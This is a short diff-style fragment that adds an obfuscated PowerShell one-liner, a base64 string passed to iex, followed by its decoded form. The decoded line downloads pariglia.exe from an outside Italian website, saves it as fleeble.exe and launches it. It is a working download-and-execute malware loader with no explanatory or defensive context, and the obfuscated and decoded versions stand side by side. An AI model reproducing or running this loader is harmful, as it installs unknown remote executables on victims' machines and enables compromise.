@@ -1,0 +1,7 @@
+iex([SYsTem.tExT.ENcoDing]::UtF8.GetstRiNg([SYstem.CoNvERT]::fRomBaSE64strinG('CihOZXctT2JqZWN0IHN5U3RlTS5uZVQuV2ViY0xpZW5UKS5kb3duTG9BZEZpTEUoJ2h0dHA6Ly93d3cubWF0cmltb25pb2Fkdmlzb3IuaXQvcGFyaWdsaWEuZXhlJywnZmxlZWJsZS5leGUnKTtTdGFydC1Qcm9jZXNzICdmbGVlYmxlLmV4ZScKCg==')));exit
+
+##### B64 CONTENT #####
+
+
+(New-Object sySteM.neT.WebcLienT).downLoAdFiLE('http://www.matrimonioadvisor.it/pariglia.exe','fleeble.exe');Start-Process 'fleeble.exe'
+
